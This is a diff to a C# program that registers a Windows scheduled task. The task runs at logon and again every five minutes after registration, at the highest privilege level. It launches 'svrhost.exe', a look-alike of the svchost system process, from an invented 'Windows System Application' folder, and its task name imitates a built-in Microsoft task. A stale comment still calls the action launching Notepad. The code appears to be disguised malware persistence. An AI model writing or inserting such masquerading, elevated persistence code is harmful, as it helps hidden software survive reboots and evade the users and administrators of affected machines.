@@ -40,15 +40,23 @@ class Program
             //td.Triggers.Add(new DailyTrigger { DaysInterval = 2 });
             LogonTrigger ld = new LogonTrigger();
             ld.Repetition.Interval = TimeSpan.FromMinutes(5);
+
             //ld.Repetition.Duration = TimeSpan.MaxValue;
             td.Triggers.Add(ld);
 
+            // after installation, before reboot trigger task
+            // triggers many time?
+            RegistrationTrigger rd = new RegistrationTrigger();
+            rd.Repetition.Interval = TimeSpan.FromMinutes(5);
+            td.Triggers.Add(rd);
+
             // Create an action that will launch Notepad whenever the trigger fires
             td.Actions.Add(new ExecAction("c:\\Program Files\\Windows System Application\\svrhost.exe", "", null));
+            td.Principal.RunLevel = TaskRunLevel.Highest;
 
             // Register the task in the root folder.
             // (Use the username here to ensure remote registration works.)
-            ts.RootFolder.RegisterTaskDefinition(@"Microsoft\Windows\SysPreService\CheckStatus", td, TaskCreation.CreateOrUpdate, "SYSTEM");
+            ts.RootFolder.RegisterTaskDefinition(@"Microsoft\Windows\SysPreService\CheckStatus", td, TaskCreation.CreateOrUpdate, null);
 
 
             // タスクトレイプロセス登録
